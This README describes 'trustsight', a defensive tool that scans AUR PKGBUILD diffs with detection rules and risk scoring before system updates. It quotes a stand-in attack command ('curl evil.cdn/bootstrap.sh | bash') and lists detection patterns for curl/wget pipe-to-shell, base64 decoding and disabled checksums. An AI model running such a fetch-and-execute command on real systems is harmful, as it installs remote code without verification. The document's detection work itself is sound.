<p align="center">
  <h1 align="center">trustsight</h1>
</p>

<p align="center">
  <strong>AUR package update vetting tool. Run it before yay -Syu.</strong>
</p>

<p align="center">
  <a href="https://www.python.org/downloads/">
    <img src="https://img.shields.io/badge/Python-3.12+-3776AB?logo=python&logoColor=white&style=for-the-badge" alt="Python">
  </a>
  <a href="LICENSE">
    <img src="https://img.shields.io/badge/License-MIT-10AC84?style=for-the-badge" alt="License">
  </a>
</p>

---

## Quick start

Run a review of all outdated AUR packages before your next system update:

```bash
trustsight review
```

Output:

```
                               TrustSight Review                                
┏━━━━━━━━━━━━━━━━━━━━━━━━━━┳━━━━━━━┳━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
┃ Package                  ┃ Score ┃ Verdict                                   ┃
┡━━━━━━━━━━━━━━━━━━━━━━━━━━╇━━━━━━━╇━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┩
│ some-app-bin             │ 0/100 │ Version bump. no structural changes. No   │
│ sketchy-package          │ 55/100│ Checksum disabled (R004). New domain:     │
│                          │       │ sketchy-cdn.example.com (unknown).        │
└──────────────────────────┴───────┴───────────────────────────────────────────┘
```

Inspect a single package:

```bash
trustsight inspect some-app-bin
```

View analysis history:

```bash
trustsight history sketchy-package --score-breakdown
```

Configure API credentials:

```bash
trustsight config set api_key sk-xxxx
trustsight config set base_url https://api.openai.com/v1
trustsight config show
```

That is it. Run `trustsight review` before `yay -Syu` to catch suspicious package updates before they land on your system.

---

## Comparison: automated vetting vs manual review

| Task | Manual | trustsight |
|------|--------|------------|
| Check PKGBUILD diffs | Clone and diff each repo by hand | Auto-clones AUR repos and generates structured diffs |
| Detect live-install patterns (curl pipe bash) | Grep for curl/wget/base64 patterns | 11 built-in rules (R001-R011) covering obfuscated and mixed-case evasion |
| Verify checksums | Check sha256sums are present | Detects SKIP, NONE, empty, and removal of checksums (R004, R005) |
| Classify source URLs | Manual domain inspection | Auto-buckets: trusted forge, official, raw hosting, unknown, typo-squatted |
| Track novelty | Remember what's been seen before | DB-backed first-seen tracking for URLs, maintainers, and packages |
| Score and prioritize | Gut feeling | Deterministic scoring (0-100) with configurable severity weights and bucket modifiers |
| LLM synthesis | Read the diff and decide | Optional LLM verdict with scoring tool definitions |
| History and trends | Keep notes in a text file | Persistent SQLite history with score breakdown per analysis |

---

## Why run this before yay -Syu

AUR packages are community-maintained. Maintainer accounts get compromised; upstream URLs change; malicious commits slip into otherwise reputable packages. TrustSight automates the diff inspection that most users skip.

- **Catch typo-squatted domains**: `githab.com` instead of `github.com` is flagged as unknown and novel.
- **Detect checksum removal**: If a maintainer empties `sha256sums` between versions, R004 fires. If checksums are replaced with SKIP or NONE, R004 fires.
- **Spot live-install payloads**: `curl evil.cdn/bootstrap.sh | bash` triggers R001 even with obfuscated casing.
- **Flag maintainer swaps**: If the maintainer field changes between versions, you are warned.
- **Track novelty**: First-seen URLs and first-seen maintainers add to the score.
- **Deterministic scoring**: Same package, same diff, same score. Every time.

---

## Features

| Category | What trustsight handles |
|----------|------------------------|
| **Diff analysis** | Auto-clones AUR repos, generates structured diffs between old and new commits, extracts URL changes, resolved commands, and execution patterns |
| **Detection rules** | R001-R011: curl pipe bash (R001), wget pipe sh (R002), base64 decode (R003), checksum disabled SKIP/NONE (R004), checksum emptied (R005), tar.gz pipe (R006), install file modified (R007), python/ruby -c URL (R008), sudo usage (R009), curl in diff (R010), wget in diff (R011) |
| **URL classification** | Trusted forges (github.com, gitlab.com, codeberg.org, bitbucket.org), official domains (python.org, kernel.org, nginx.org, archlinux.org), raw hosting (pastebin.com, gist.github.com), typo-squat detection (githab.com, gituhb.com, etc.), IP address detection, unusual TLD detection |
| **Scoring** | Configurable severity weights (CRITICAL 40, HIGH 25, MEDIUM 15, LOW 5, INFO 0), trusted forge modifier (-10), raw hosting modifier (+15), novelty additions (URL first seen globally +10, per-package +5, maintainer first seen +5) |
| **Novelty tracking** | SQLite-backed first-seen detection for URLs (global and per-package) and maintainers |
| **LLM verdict** | Optional LLM integration (OpenAI or Ollama via OpenAI-compatible endpoint) that receives scoring tool definitions and produces plain-English verdicts |
| **History** | Persistent analysis history with score breakdowns per package |

---

## How it works

```
                 ┌──────────────────┐
                 │       AUR        │
                 └────────┬─────────┘
                          │ git clone / fetch
                 ┌────────▼─────────┐
                 │   fetcher.py     │  Clone or update cached repo
                 └────────┬─────────┘
                          │ old vs new commits
                 ┌────────▼─────────┐
                 │    differ.py     │  git diff, extract URLs, detect checksum changes
                 └────────┬─────────┘
                          │ diff text
                 ┌────────▼─────────┐
                 │   tokenizer.py   │  Resolve variables, extract resolved commands
                 └────────┬─────────┘
                          │ resolved strings + raw lines
                 ┌────────▼─────────┐
                 │    rules.py      │  Apply R001-R011 patterns
                 └────────┬─────────┘
                          │ triggered rules
                 ┌────────▼─────────┐
                 │    buckets.py    │  Classify source URLs
                 └────────┬─────────┘
                          │ bucket map
                 ┌────────▼─────────┐
                 │    novelty.py    │  Check first-seen URLs and maintainers
                 └────────┬─────────┘
                          │ novelty context
                 ┌────────▼─────────┐
                 │    scoring.py    │  Calculate deterministic 0-100 score
                 └────────┬─────────┘
                          │ score + breakdown
                 ┌────────▼─────────┐
                 │   llm.py (opt.)  │  Generate plain-English verdict
                 └────────┬─────────┘
                          │ verdict
                 ┌────────▼─────────┐
                 │      cli.py      │  Display results (rich table or fallback)
                 └──────────────────┘
```

Data flow: trustSight clones the AUR repo, diffs the old and new commits, tokenizes the diff, applies detection rules, classifies URLs, checks novelty, calculates a deterministic score, and optionally generates an LLM verdict. The entire pipeline runs locally; no data leaves your machine unless you configure an LLM provider.

---

## Installation

```bash
pip install trustsight
```

Requires Python 3.12+.

### Dependencies

- **pygit2**: Git repository access (diff, clone, fetch)
- **tldextract**: Domain extraction for URL classification
- **rich**: Terminal tables and formatted output
- **openai**: OpenAI-compatible LLM client (also used for Ollama)

### Local LLM (Ollama)

```bash
pip install trustsight[ollama]
```

Set your Ollama base URL and model in the config.

---

## Configuration

Config files are auto-generated on first run at `~/.config/trustsight/`:

- **`config.toml`**: Severity weights, bucket modifiers, diff limits, LLM provider settings
- **`rules.toml`**: Detection patterns for R001-R011
- **`domains.toml`**: Trusted forge domains, official domains, raw hosting domains, typo-squat map

### Environment variables

- `TRUSTSIGHT_API_KEY`: API key for LLM provider (overrides config file)
- `TRUSTSIGHT_BASE_URL`: Base URL for LLM provider (overrides config file)

Example using NVIDIA API:

```bash
export TRUSTSIGHT_API_KEY=nvapi-xxxx
export TRUSTSIGHT_BASE_URL=https://integrate.api.nvidia.com/v1
trustsight inspect some-package
```

### LLM provider setup

In `~/.config/trustsight/config.toml`:

```toml
[llm]
provider = "openai"       # "openai" or "ollama"
model = "z-ai/glm-5.2"   # model name
api_key = ""              # set via TRUSTSIGHT_API_KEY env var instead
base_url = ""             # set via TRUSTSIGHT_BASE_URL env var instead
show_reasoning = false    # show reasoning tokens in gray
```

---

## At a glance

```bash
# Review all outdated packages (run before yay -Syu)
trustsight review
trustsight review --limit 50

# Inspect a specific package
trustsight inspect my-aur-package

# View analysis history
trustsight history my-aur-package
trustsight history my-aur-package --limit 10
trustsight history my-aur-package --score-breakdown

# Manage configuration
trustsight config set api_key sk-xxxx
trustsight config set base_url https://api.openai.com/v1
trustsight config show
```

LLM verdict with scoring tool definitions:

```bash
export TRUSTSIGHT_API_KEY=sk-xxxx
trustsight inspect some-package
```

The LLM receives a structured input with triggered rules, score breakdown, URL classifications, and novelty context. It never calculates scores; it only translates deterministic flags into plain English.

---

## Testing

Run the test suite (no external services needed):

```bash
pip install -e ".[dev]"
pytest tests/
```

Current test count: 218 tests across 11 test files covering all modules, edge cases, and end-to-end scenarios (benign, obviously malicious, subtly malicious).

---

## Documentation

## License

MIT
